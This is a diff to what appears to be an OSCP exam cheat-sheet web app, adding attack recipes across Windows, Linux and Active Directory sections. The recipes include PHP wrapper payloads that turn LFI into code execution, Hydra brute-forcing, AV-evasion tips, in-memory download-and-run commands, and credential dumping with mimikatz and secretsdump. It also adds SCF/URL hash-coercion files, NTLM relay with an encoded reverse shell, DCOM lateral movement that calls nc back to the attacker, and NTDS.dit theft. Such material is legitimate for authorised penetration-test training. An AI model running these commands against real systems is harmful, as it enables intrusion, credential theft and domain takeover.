@@ -234,7 +234,7 @@ cd ~/oscp/$IP</div>
 <span class="ct">rpcclient</span> <span class="cf">-U "" -N</span> <span class="cv">$IP</span> <span class="cf">-c</span> "srvinfo"
 <span class="cm"># Add discovered hostname/domain to /etc/hosts and rescan</span></div>`},
 
-{step:"02",title:"20-Minute Decision Tree (When Nervous)",body:`<div class="wb"><strong>Exam Guardrails:</strong> No SQLmap, no Nessus, no AI, no Responder poisoning. Metasploit on max 1 target. msfvenom + multi/handler elsewhere OK. No Metasploit pivoting.</div>
+{step:"02",title:"20-Minute Decision Tree (When Nervous)",body:`<div class="wb"><strong>Exam Guardrails:</strong> No SQLmap, no Nessus, no AI. No LLMNR/NBT-NS/MDNS poisoning. Responder as a passive SMB listener to capture coerced auth is allowed. Metasploit on max 1 target. msfvenom + multi/handler elsewhere OK. No Metasploit pivoting.</div>
 <div class="cb"><span class="cm">First 20 minutes when you're panicking:</span>
 1. Read nmap output fully (every port, every version)
    +-- Host seems down? Re-run with -Pn
@@ -289,7 +289,16 @@ cd ~/oscp/$IP</div>
 <li>SMB readable backups &rarr; old configs, registry hives, scripts</li>
 <li>RDP creds + GUI &rarr; desktop notes, saved creds, app configs</li>
 <li>SNMP extend objects &rarr; direct command execution</li>
-</ul>`},
+</ul>
+<div class="tb"><strong>When a Public Exploit Fails:</strong>
+<ul>
+<li>Read the code before running it &mdash; understand what it does</li>
+<li>Check architecture (x86 vs x64) and change compilation flags</li>
+<li>Replace hardcoded IPs, ports, and URLs with your own</li>
+<li>Replace shellcode with your own msfvenom payload</li>
+<li>Fix python2 &rarr; python3 issues (print statements, imports)</li>
+<li>Cross-compile: <code>gcc</code> for Linux, <code>x86_64-w64-mingw32-gcc</code> for Windows</li>
+</ul></div>`},
 
 {step:"04",title:"Web Enumeration Deep",body:`<h4>Directory Brute-Force (Recursive Depth 4)</h4>
 <div class="cb"><span class="ct">feroxbuster</span> <span class="cf">-u</span> <span class="cv">http://$IP/</span> <span class="cf">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt <span class="cf">-x</span> php,html,txt,bak,old,conf,json,xml,asp,aspx,jsp <span class="cf">-t 50 --depth 4</span>
@@ -320,6 +329,16 @@ admin'--
 ....//....//....//....//windows/system32/drivers/etc/hosts
 ..%252f..%252f..%252fwindows/system32/drivers/etc/hosts
 %2e%2e/%2e%2e/windows/system32/drivers/etc/hosts</div>
+<h4>PHP Wrappers (LFI &rarr; Source Read / RCE)</h4>
+<div class="cb"><span class="cm"># Read PHP source code (base64 encoded output)</span>
+php://filter/convert.base64-encode/resource=config.php
+
+<span class="cm"># LFI to RCE via data:// (requires allow_url_include=On)</span>
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&amp;cmd=whoami
+
+<span class="cm"># LFI to RCE via php://input (POST body = PHP code)</span>
+<span class="ct">curl</span> -X POST "http://$IP/vuln.php?page=php://input" -d "&lt;?php system('whoami'); ?&gt;"</div>
+<div class="tb"><strong>Note:</strong> data:// and php://input need allow_url_include=On. php://filter works regardless.</div>
 <h4>File Upload Bypass (.htaccess Trick)</h4>
 <div class="cb"><span class="cm"># Upload .htaccess to make .evil executable as PHP</span>
 AddType application/x-httpd-php .evil
@@ -377,7 +396,17 @@ EXEC xp_cmdshell 'whoami';</div>
 <tr><td>CouchDB</td><td>admin</td><td>(admin party / blank)</td></tr>
 <tr><td>Splunk</td><td>admin</td><td>changeme</td></tr>
 <tr><td>Linux generic</td><td>ubuntu / kali / vagrant</td><td>same as username</td></tr>
-</table>`},
+</table>
+<h4>Hydra Targeted Brute-Force (After Default Creds Fail)</h4>
+<div class="wb"><strong>Check lockout policy first.</strong> Use ONLY after default creds fail. One password at a time for domain accounts.</div>
+<div class="cb"><span class="cm"># SSH brute-force</span>
+<span class="ct">hydra</span> <span class="cf">-l</span> &lt;USER&gt; <span class="cf">-P</span> /usr/share/wordlists/rockyou.txt <span class="cv">ssh://$IP</span>
+
+<span class="cm"># RDP brute-force</span>
+<span class="ct">hydra</span> <span class="cf">-L</span> users.txt <span class="cf">-p</span> '&lt;PASS&gt;' <span class="cv">rdp://$IP</span>
+
+<span class="cm"># HTTP POST form</span>
+<span class="ct">hydra</span> <span class="cf">-l</span> admin <span class="cf">-P</span> /usr/share/wordlists/rockyou.txt <span class="cv">$IP</span> <span class="cf">http-post-form</span> "/login:user=^USER^&amp;pass=^PASS^:Invalid"</div>`},
 
 {step:"07",title:"Reverse Shells & File Transfer",body:`<h4>Penelope Shell Handler (OSCP Safe)</h4>
 <div class="cb"><span class="ct">penelope</span> <span class="cf">-O -i tun0 -p 4444</span>
@@ -389,6 +418,14 @@ EXEC xp_cmdshell 'whoami';</div>
 <h4>msfvenom (non-Meterpreter payloads OK everywhere)</h4>
 <div class="cb"><span class="ct">msfvenom</span> <span class="cf">-p</span> windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 <span class="cf">-f exe -o</span> shell.exe
 <span class="ct">msfvenom</span> <span class="cf">-p</span> windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 <span class="cf">-f aspx -o</span> shell.aspx</div>
+<div class="tb"><strong>If AV Blocks Your Payload:</strong>
+<ul>
+<li>In-memory execution: <code>IEX(New-Object Net.WebClient).DownloadString('http://KALI/shell.ps1')</code></li>
+<li>Try non-staged payloads (<code>shell_reverse_tcp</code> not <code>shell/reverse_tcp</code>)</li>
+<li>Alternative formats: .aspx, .hta, .js, .vbs, .war</li>
+<li>Move payload to less-scanned directory (<code>C:\\Windows\\Temp</code>)</li>
+<li>Rename payload to something benign (e.g. svc_update.exe)</li>
+</ul></div>
 <h4>File Transfer to Windows Target</h4>
 <div class="cb"><span class="cm"># Kali: start HTTP server</span>
 <span class="ct">python3 -m http.server 8000</span>
@@ -560,6 +597,17 @@ dir C:\\inetpub /s /b web.config 2>nul</div>
 <h4>DPAPI Credential Blobs</h4>
 <div class="cb"><span class="ct">Get-ChildItem</span> C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Credentials\\ -Force
 <span class="ct">Get-ChildItem</span> C:\\Users\\*\\AppData\\Local\\Microsoft\\Credentials\\ -Force</div>
+<h4>KeePass Database Cracking</h4>
+<div class="cb"><span class="cm"># Find .kdbx files</span>
+dir C:\\ /s /b *.kdbx 2>nul
+
+<span class="cm"># Transfer to Kali, then extract hash:</span>
+<span class="ct">keepass2john</span> database.kdbx > keepass_hash.txt
+
+<span class="cm"># Crack:</span>
+<span class="ct">hashcat -m 13400</span> keepass_hash.txt /usr/share/wordlists/rockyou.txt
+<span class="cm"># Or:</span>
+<span class="ct">john</span> --wordlist=/usr/share/wordlists/rockyou.txt keepass_hash.txt</div>
 <h4>WiFi Passwords</h4>
 <div class="cb"><span class="ct">netsh wlan show profiles</span>
 <span class="ct">netsh wlan show profile</span> name="&lt;NETWORK&gt;" key=clear</div>`},
@@ -626,6 +674,7 @@ win_admin:{title:"Windows \u2014 Post-Exploitation",sections:[
 {step:"02",title:"Credential Harvesting",body:`<h4>${T.mk} One-Line Dump Sweep</h4>
 <div class="cb"><span class="ct">${T.mk}.exe</span> "privilege::debug" "token::elevate" "log" "lsadump::sam /patch" "lsadump::sam" "lsadump::secrets" "lsadump::lsa" "lsadump::lsa /patch" "lsadump::cache" "sekurlsa::msv" "sekurlsa::logonpasswords full" "sekurlsa::ekeys" "sekurlsa::dpapi" "sekurlsa::credman" "vault::list" "vault::cred /patch" "exit"</div>
 <div class="tb"><strong>Tip:</strong> Use a pinned stable ${T.mk} build if the latest crashes. Only run after admin/SYSTEM confirmed.</div>
+<div class="tb"><strong>If ${T.mk} sekurlsa::logonpasswords returns empty:</strong> Credential Guard may be enabled. Fall back to: SAM dump (lsadump::sam), registry secrets (lsadump::secrets), DPAPI blobs, or impacket-secretsdump from Kali.</div>
 <h4>NetExec from Kali</h4>
 <div class="cb"><span class="ct">nxc smb</span> $IP <span class="cf">-u Administrator -p '&lt;pass&gt;' --sam</span>
 <span class="ct">nxc smb</span> $IP <span class="cf">-u Administrator -p '&lt;pass&gt;' --lsa</span>
@@ -703,7 +752,14 @@ redis-cli -h $IP save</div>
 <span class="ct">psql -h</span> $IP <span class="cf">-U postgres</span>
 <span class="ct">impacket-mssqlclient</span> sa@$IP</div>
 <h4>SMTP User Enum</h4>
-<div class="cb"><span class="ct">smtp-user-enum</span> -M VRFY -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t $IP</div>`},
+<div class="cb"><span class="ct">smtp-user-enum</span> -M VRFY -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t $IP</div>
+<h4>Hydra Targeted Brute-Force (After Default Creds Fail)</h4>
+<div class="wb"><strong>Check lockout policy first.</strong> Use ONLY after default creds fail.</div>
+<div class="cb"><span class="cm"># SSH brute-force</span>
+<span class="ct">hydra</span> <span class="cf">-l</span> &lt;USER&gt; <span class="cf">-P</span> /usr/share/wordlists/rockyou.txt <span class="cv">ssh://$IP</span>
+
+<span class="cm"># HTTP POST form</span>
+<span class="ct">hydra</span> <span class="cf">-l</span> admin <span class="cf">-P</span> /usr/share/wordlists/rockyou.txt <span class="cv">$IP</span> <span class="cf">http-post-form</span> "/login:user=^USER^&amp;pass=^PASS^:Invalid"</div>`},
 
 {step:"03",title:"Web Enumeration Deep",body:`<h4>Feroxbuster Recursive (Depth 4)</h4>
 <div class="cb"><span class="ct">feroxbuster</span> -u http://$IP/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak,old,conf,json,xml,cgi,pl,py -t 50 --depth 4
@@ -726,6 +782,16 @@ cd git-dump && git log --oneline && git diff HEAD~5</div>
 ../../../../../../etc/passwd
 ....//....//....//etc/passwd
 ..%252f..%252fetc/passwd</div>
+<h4>PHP Wrappers (LFI &rarr; Source Read / RCE)</h4>
+<div class="cb"><span class="cm"># Read PHP source code (base64 encoded output)</span>
+php://filter/convert.base64-encode/resource=config.php
+
+<span class="cm"># LFI to RCE via data:// (requires allow_url_include=On)</span>
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&amp;cmd=whoami
+
+<span class="cm"># LFI to RCE via php://input (POST body = PHP code)</span>
+<span class="ct">curl</span> -X POST "http://$IP/vuln.php?page=php://input" -d "&lt;?php system('whoami'); ?&gt;"</div>
+<div class="tb"><strong>Note:</strong> data:// and php://input need allow_url_include=On. php://filter works regardless.</div>
 <h4>WordPress</h4>
 <div class="cb"><span class="ct">wpscan</span> --url http://$IP/ --enumerate u,p,t --plugins-detection aggressive</div>
 <h4>Tomcat / Jenkins on Linux</h4>
@@ -896,12 +962,27 @@ cp /bin/bash /tmp/bash_suid && chmod +s /tmp/bash_suid
 <div class="cb"><span class="ct">find /</span> -type f \\( -iname '*.txt' -o -iname '*.log' -o -iname '*.ini' -o -iname '*.kdbx' -o -iname '*.db' -o -iname '*.bak' -o -iname '.env*' \\) 2>/dev/null</div>
 <h4>Credential Search</h4>
 <div class="cb">grep -RniE 'pass|password|passwd|pwd|secret|token|key|credential' /home /opt /srv /var/www /var/backups 2>/dev/null | head -300</div>
+<h4>KeePass Database Cracking</h4>
+<div class="cb"><span class="cm"># Find .kdbx files</span>
+find / -iname '*.kdbx' 2>/dev/null
+
+<span class="cm"># Transfer to Kali, then extract hash:</span>
+<span class="ct">keepass2john</span> database.kdbx > keepass_hash.txt
+
+<span class="cm"># Crack:</span>
+<span class="ct">hashcat -m 13400</span> keepass_hash.txt /usr/share/wordlists/rockyou.txt
+<span class="cm"># Or:</span>
+<span class="ct">john</span> --wordlist=/usr/share/wordlists/rockyou.txt keepass_hash.txt</div>
 <h4>SSH Key Handling</h4>
 <div class="cb"><span class="cm"># Found id_rsa? Copy to Kali:</span>
 chmod 600 id_rsa
 ssh -i id_rsa &lt;user&gt;@$IP
 <span class="cm"># Fix formatting if broken:</span>
 sed -i 's/\\r$//' id_rsa</div>
+<h4>SSH Key Passphrase Cracking</h4>
+<div class="cb"><span class="cm"># If ssh -i id_rsa asks for passphrase, crack it first:</span>
+<span class="ct">ssh2john</span> id_rsa > ssh_hash.txt
+<span class="ct">john</span> --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.txt</div>
 <h4>Writable /etc/passwd</h4>
 <div class="cb"><span class="ct">ls -la /etc/passwd</span>
 <span class="cm"># If writable:</span>
@@ -973,6 +1054,15 @@ psql -U postgres -c "COPY (SELECT '') TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/
 gcc exploit.c -o exploit
 gcc exploit.c -o exploit -static
 gcc exploit.c -o exploit -m32</div>
+<div class="tb"><strong>When a Public Exploit Fails:</strong>
+<ul>
+<li>Read the code before running it &mdash; understand what it does</li>
+<li>Check architecture (x86 vs x64) and change compilation flags</li>
+<li>Replace hardcoded IPs, ports, and URLs with your own</li>
+<li>Replace shellcode with your own msfvenom payload</li>
+<li>Fix python2 &rarr; python3 issues (print statements, imports)</li>
+<li>Cross-compile: <code>gcc</code> for Linux, <code>x86_64-w64-mingw32-gcc</code> for Windows</li>
+</ul></div>
 <h4>Proof Capture</h4>
 <div class="cb"><span class="ct">whoami</span> && <span class="ct">hostname</span> && <span class="ct">ip addr</span>
 <span class="ct">cat /root/proof.txt</span>
@@ -1021,7 +1111,7 @@ cat /home/*/.bash_history 2>/dev/null</div>
 ]},
 
 ad_initial:{title:"AD Set \u2014 Initial Access to MS01",sections:[
-{step:"01",title:"Exam Guardrails & Variable Setup (Optional)",body:`<div class="wb"><strong>AD Set = 40 points (MS01: 10, MS02: 10, DC01: 20).</strong> No SQLmap, no Nessus, no AI, no Responder poisoning. Metasploit on max 1 target. No Metasploit pivoting.</div>
+{step:"01",title:"Exam Guardrails & Variable Setup (Optional)",body:`<div class="wb"><strong>AD Set = 40 points (MS01: 10, MS02: 10, DC01: 20).</strong> No SQLmap, no Nessus, no AI. No LLMNR/NBT-NS/MDNS poisoning. Responder as a passive SMB listener to capture coerced auth is allowed. Metasploit on max 1 target. No Metasploit pivoting.</div>
 <h4>Variables</h4>
 <div class="cb"><span class="ct">export</span> DOM=&lt;DOMAIN&gt;  DC=&lt;DC_HOSTNAME&gt;  DC_IP=&lt;DC_IP&gt;
 <span class="ct">export</span> USER=&lt;foothold_user&gt;  PASS='&lt;foothold_pass&gt;'
@@ -1084,6 +1174,12 @@ net users</div>
 <h4>Collect Domain Data</h4>
 <div class="cb"><span class="ct">bloodhound-ce-python</span> --zip -c All -d $DOM -u $USER -p "$PASS" -dc $DC -ns $DC_IP
 <span class="cm"># Upload the resulting .zip to ${T.bh} CE web UI</span></div>
+<h4>${T.shh} Collection (From Windows Foothold)</h4>
+<div class="cb"><span class="cm"># Use when you can't reach DC from Kali yet (before pivot setup):</span>
+Import-Module .\\${T.shh}.ps1
+Invoke-${T.bh} -CollectionMethod All -OutputDirectory C:\\temp\\ -OutputPrefix "enum"
+<span class="cm"># Download the .zip and upload to ${T.bh} CE</span></div>
+<div class="tb"><strong>AV Note:</strong> If ${T.shh}.ps1 is blocked by AV, try ${T.shh}.exe instead, or run from C:\\Windows\\Temp. As a last resort, use bloodhound-ce-python from Kali through the pivot.</div>
 <h4>Mark Owned &amp; Find the Path</h4>
 <ul>
 <li>Mark your foothold user as <strong>Owned</strong></li>
@@ -1156,6 +1252,7 @@ ad_ms01_admin:{title:"AD \u2014 Post-Admin MS01 & Lateral Movement",sections:[
 <div class="cb"><span class="ct">nxc smb</span> $MS01 -u Administrator -p '&lt;pass&gt;' --sam
 <span class="ct">nxc smb</span> $MS01 -u Administrator -p '&lt;pass&gt;' --lsa
 <span class="ct">nxc smb</span> $MS01 -u Administrator -p '&lt;pass&gt;' -M lsassy</div>
+<div class="tb"><strong>If ${T.mk} sekurlsa::logonpasswords returns empty:</strong> Credential Guard may be enabled. Fall back to: SAM dump (lsadump::sam), registry secrets (lsadump::secrets), DPAPI blobs, or impacket-secretsdump from Kali.</div>
 <div class="wb"><strong>Key:</strong> Note the <strong>Domain</strong> field in credential output. Domain creds are your ticket to lateral movement.</div>`},
 
 {step:"02",title:"Ligolo-ng Pivoting (Full Guide)",body:`<h4>Step A: Start Proxy on Kali</h4>
@@ -1204,6 +1301,27 @@ autoroute
 <span class="cm"># On MS02, agent connects to MS01's internal IP:</span>
 agent.exe -connect &lt;MS01_INTERNAL_IP&gt;:11602 -ignore-cert
 <span class="cm"># In Ligolo: interface_create --name ligolo-ms02</span></div>
+<h4>Fallback: SSH Tunneling, Socat &amp; Port Forwarding</h4>
+<div class="cb"><span class="cm"># socat simple port forward (on compromised host)</span>
+<span class="ct">socat</span> TCP-LISTEN:2345,fork TCP:&lt;INTERNAL_IP&gt;:&lt;PORT&gt;
+
+<span class="cm"># SSH local forward (access internal service from Kali)</span>
+<span class="ct">ssh</span> -N -L &lt;LOCAL_PORT&gt;:&lt;INTERNAL_IP&gt;:&lt;PORT&gt; user@pivot
+
+<span class="cm"># SSH dynamic SOCKS proxy (use with proxychains)</span>
+<span class="ct">ssh</span> -N -D 1080 user@pivot
+
+<span class="cm"># SSH remote forward (callback from internal to Kali)</span>
+<span class="ct">ssh</span> -N -R &lt;KALI_PORT&gt;:&lt;INTERNAL_IP&gt;:&lt;PORT&gt; kali@$KALI
+
+<span class="cm"># sshuttle (VPN-like, no proxychains needed)</span>
+<span class="ct">sshuttle</span> -r user@pivot &lt;INTERNAL_SUBNET&gt;/24
+
+<span class="cm"># plink.exe (older Windows without OpenSSH)</span>
+<span class="ct">plink.exe</span> -ssh -l user -pw pass -R &lt;KALI_PORT&gt;:&lt;INTERNAL_IP&gt;:&lt;PORT&gt; $KALI
+
+<span class="cm"># Windows native port forward (netsh)</span>
+<span class="ct">netsh interface portproxy add v4tov4</span> listenport=&lt;LP&gt; listenaddress=0.0.0.0 connectport=&lt;RP&gt; connectaddress=&lt;REMOTE_IP&gt;</div>
 <h4>Fallback: Chisel SOCKS</h4>
 <div class="cb"><span class="cm"># Kali:</span> chisel server --reverse -p 8080
 <span class="cm"># Target:</span> chisel client &lt;KALI&gt;:8080 R:socks
@@ -1242,7 +1360,38 @@ cd ~/bloodhound-ce && docker compose up -d
 <span class="cm"># Unconstrained delegation check</span>
 <span class="ct">nxc ldap</span> $DC_IP -u $USER -p "$PASS" --trusted-for-delegation</div>`},
 
-{step:"04",title:"Kerberoasting & AS-REP Roasting",body:`<h4>Kerberoasting</h4>
+{step:"04",title:"Net-NTLMv2 Capture & Relay",body:`<h4>Coercion Methods (Force Auth to Your Listener)</h4>
+<p>Drop these in any writable SMB share &mdash; anyone browsing that folder auto-sends their NTLMv2 hash to your listener.</p>
+<div class="cb"><span class="cm"># .scf file (save as @malicious.scf &mdash; @ sorts to top):</span>
+[Shell]
+Command=2
+IconFile=\\\\$KALI\\share\\icon.ico
+[Taskbar]
+Command=ToggleDesktop</div>
+<div class="cb"><span class="cm"># .url file alternative:</span>
+[InternetShortcut]
+URL=whatever
+IconFile=\\\\$KALI\\share\\icon.ico
+IconIndex=1</div>
+<div class="tb"><strong>Other coercion:</strong> SSRF pointing to <code>\\\\$KALI\\share</code>, file:// links in web apps, <code>xp_dirtree '\\\\KALI\\share'</code> in MSSQL.</div>
+<h4>Capture NTLMv2 Hashes</h4>
+<div class="cb"><span class="cm"># Option 1: impacket-smbserver (simple listener)</span>
+<span class="ct">impacket-smbserver</span> share . -smb2support
+
+<span class="cm"># Option 2: Responder listen-only (no poisoning flags!)</span>
+<span class="ct">responder</span> -I tun0 -v
+<span class="cm"># Do NOT use -P or -w flags (those enable poisoning = exam violation)</span></div>
+<h4>Crack NTLMv2 Hashes</h4>
+<div class="cb"><span class="ct">hashcat -m 5600</span> ntlmv2.txt /usr/share/wordlists/rockyou.txt <span class="cf">-r /usr/share/hashcat/rules/best64.rule</span></div>
+<h4>NTLMv2 Relay (Instead of Cracking)</h4>
+<div class="cb"><span class="cm"># Check if SMB signing is disabled on target (required for relay):</span>
+<span class="ct">nxc smb</span> &lt;TARGET&gt; --gen-relay-list relay_targets.txt
+
+<span class="cm"># Relay captured auth to execute commands:</span>
+<span class="ct">impacket-ntlmrelayx</span> -t &lt;TARGET&gt; -smb2support -c "powershell -enc &lt;BASE64_REVSHELL&gt;"</div>
+<div class="wb"><strong>Relay requires SMB signing disabled on the target.</strong> If signing is enforced, you must crack the hash instead.</div>`},
+
+{step:"05",title:"Kerberoasting & AS-REP Roasting",body:`<h4>Kerberoasting</h4>
 <div class="cb"><span class="ct">nxc ldap</span> $DC_IP -u $USER -p "$PASS" --kerberoasting kerb_hashes.txt
 
 <span class="cm"># Hash type guide:</span>
@@ -1258,7 +1407,7 @@ cd ~/bloodhound-ce && docker compose up -d
 <span class="cm"># Without creds (need username list):</span>
 <span class="ct">impacket-GetNPUsers</span> $DOM/ -usersfile users.txt -dc-ip $DC_IP -format hashcat</div>`},
 
-{step:"05",title:"ACL / DACL Abuse (WriteDACL, WriteOwner, GenericAll)",body:`<div class="tb"><strong>Exam Tip:</strong> WriteDACL is a common path. Grant yourself rights, add to Domain Admins, DCSync.</div>
+{step:"06",title:"ACL / DACL Abuse (WriteDACL, WriteOwner, GenericAll)",body:`<div class="tb"><strong>Exam Tip:</strong> WriteDACL is a common path. Grant yourself rights, add to Domain Admins, DCSync.</div>
 <h4>WriteDACL (grant yourself FullControl)</h4>
 <div class="cb"><span class="ct">dacledit.py</span> -action write -rights FullControl -principal $USER -target &lt;TARGET_USER_OR_GROUP&gt; $DOM/$USER:"$PASS" -dc-ip $DC_IP</div>
 <h4>WriteOwner</h4>
@@ -1275,7 +1424,7 @@ cd ~/bloodhound-ce && docker compose up -d
 <span class="cm"># After cracking, clean up the SPN:</span>
 <span class="ct">bloodyAD</span> --host $DC_IP -d $DOM -u $USER -p "$PASS" set object &lt;target_user&gt; servicePrincipalName</div>`},
 
-{step:"06",title:"bloodyAD — Recommended AD Swiss-Army Knife",body:`<p><a href="https://github.com/CravateRouge/bloodyAD" target="_blank">bloodyAD</a> is the recommended tool for AD object manipulation from Kali. It handles most ACL abuse, group changes, and password resets in a single tool without needing PowerShell on the target.</p>
+{step:"07",title:"bloodyAD — Recommended AD Swiss-Army Knife",body:`<p><a href="https://github.com/CravateRouge/bloodyAD" target="_blank">bloodyAD</a> is the recommended tool for AD object manipulation from Kali. It handles most ACL abuse, group changes, and password resets in a single tool without needing PowerShell on the target.</p>
 <div class="cb"><span class="cm"># Install (one-time)</span>
 <span class="ct">pipx install bloodyAD</span></div>
 <h4>Quick Reference &mdash; Common Operations</h4>
@@ -1292,7 +1441,7 @@ cd ~/bloodhound-ce && docker compose up -d
 </table>
 <div class="tb"><strong>Why bloodyAD?</strong> It runs from Kali (through Ligolo), doesn't need PowerShell on the target, supports NTLM hash auth (<code>-p :&lt;HASH&gt;</code>), and handles most AD object manipulation in one tool. Use it instead of juggling dacledit, owneredit, and PowerShell AD modules.</div>`},
 
-{step:"07",title:"Password Spraying & Credential Reuse",body:`<div class="cb"><span class="cm"># Spray against MS02 (one password at a time!)</span>
+{step:"08",title:"Password Spraying & Credential Reuse",body:`<div class="cb"><span class="cm"># Spray against MS02 (one password at a time!)</span>
 <span class="ct">nxc smb</span> $MS02 -u users.txt -p passwords.txt --continue-on-success
 <span class="ct">nxc smb</span> $MS02 -u users.txt -p passwords.txt --local-auth --continue-on-success
 
@@ -1311,7 +1460,8 @@ EXEC xp_cmdshell 'powershell -enc &lt;BASE64_STRING&gt;'</div>
 <h4>Share/File Hunting & LAPS</h4>
 <div class="cb"><span class="ct">nxc smb</span> $DC_IP -u $USER -p "$PASS" --shares
 <span class="ct">nxc smb</span> $DC_IP -u $USER -p "$PASS" -M spider_plus
-<span class="ct">nxc ldap</span> $DC_IP -u $USER -p "$PASS" -M laps</div>`}
+<span class="ct">nxc ldap</span> $DC_IP -u $USER -p "$PASS" -M laps</div>
+<div class="tb"><strong>Stuck?</strong> Have an NTLM hash but NTLM auth blocked? See <strong>Overpass the Hash</strong> in the MS02&rarr;DC section. PsExec/WMI/SMBExec all blocked? See <strong>DCOM Lateral Movement</strong> in the MS02&rarr;DC section.</div>`}
 ]},
 
 ad_ms02:{title:"AD \u2014 MS02 to Domain Controller",sections:[
@@ -1368,6 +1518,19 @@ export KRB5CCNAME=Administrator@cifs_&lt;TARGET&gt;.$DOM@$DOM.ccache
 <span class="ct">impacket-wmiexec</span> $DOM/administrator:'&lt;pass&gt;'@$DC_IP
 <span class="ct">impacket-atexec</span> $DOM/administrator:'&lt;pass&gt;'@$DC_IP 'whoami'
 <span class="ct">evil-winrm</span> -i $DC_IP -u administrator -p '&lt;pass&gt;'</div>
+<h4>DCOM Lateral Movement (If Others Blocked)</h4>
+<div class="cb"><span class="cm"># Alternative when PsExec/WMI/SMBExec blocked &mdash; requires local admin on target</span>
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","&lt;TARGET&gt;"))
+$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c C:\\temp\\nc.exe &lt;KALI&gt; 443 -e cmd.exe","7")</div>
+<h4>Overpass the Hash (NTLM &rarr; Kerberos TGT)</h4>
+<div class="cb"><span class="cm"># Use when NTLM auth is blocked but you have a hash &mdash; converts hash to Kerberos TGT</span>
+<span class="ct">impacket-getTGT</span> $DOM/&lt;user&gt; -hashes :&lt;NTLM_HASH&gt; -dc-ip $DC_IP
+export KRB5CCNAME=&lt;user&gt;.ccache
+
+<span class="cm"># Then use -k -no-pass with any impacket tool:</span>
+<span class="ct">impacket-psexec</span> -k -no-pass $DC.$DOM
+<span class="ct">impacket-wmiexec</span> -k -no-pass $DC.$DOM
+<span class="ct">impacket-smbexec</span> -k -no-pass $DC.$DOM</div>
 <h4>Pass-the-Ticket (PTT) with .ccache</h4>
 <div class="cb"><span class="cm"># Use Kerberos ticket from impacket-getST or impacket-getTGT:</span>
 export KRB5CCNAME=Administrator.ccache
@@ -1376,6 +1539,14 @@ export KRB5CCNAME=Administrator.ccache
 <span class="ct">impacket-smbexec</span> -k -no-pass $DC.$DOM</div>
 <h4>DCSync (Dump All Domain Hashes)</h4>
 <div class="cb"><span class="ct">impacket-secretsdump</span> -just-dc $DOM/&lt;admin&gt;:'&lt;pass&gt;'@$DC_IP</div>
+<h4>NTDS.dit Extraction via Shadow Copy (DCSync Alternative)</h4>
+<div class="cb"><span class="cm"># Use when you have shell on DC but DCSync fails (not DA, or replication rights not granted)</span>
+<span class="ct">vssadmin</span> create shadow /for=C:
+copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\temp\\ntds.dit
+copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\temp\\SYSTEM
+
+<span class="cm"># Transfer both files to Kali, then:</span>
+<span class="ct">impacket-secretsdump</span> -ntds ntds.dit -system SYSTEM LOCAL</div>
 <h4>WriteDACL &rarr; Domain Admins &rarr; DCSync</h4>
 <div class="cb"><span class="cm"># After WriteDACL abuse:</span>
 <span class="ct">bloodyAD</span> --host $DC_IP -d $DOM -u $USER -p "$PASS" add groupMember "Domain Admins" $USER
@@ -1393,6 +1564,7 @@ export KRB5CCNAME=Administrator.ccache
 <span class="ct">impacket-psexec</span> -k -no-pass $DC.$DOM
 
 <span class="cm"># Silver Ticket (service-specific, e.g. MSSQL):</span>
+<span class="cm"># Need: service account NTLM hash (from Kerberoast crack or secretsdump) + domain SID (whoami /user &rarr; strip last RID)</span>
 <span class="ct">impacket-ticketer</span> -nthash &lt;service_NTLM&gt; -domain-sid &lt;SID&gt; -domain $DOM -spn MSSQLSvc/$DC.$DOM:1433 Administrator</div>
 <div class="wb"><strong>DC01 = 20 points. Screenshot proof.txt with <code>whoami && hostname && ipconfig</code> visible. The screenshot is required for the report.</strong></div>
 <div class="cb"><span class="ct">type</span> C:\\Users\\Administrator\\Desktop\\proof.txt</div>`}
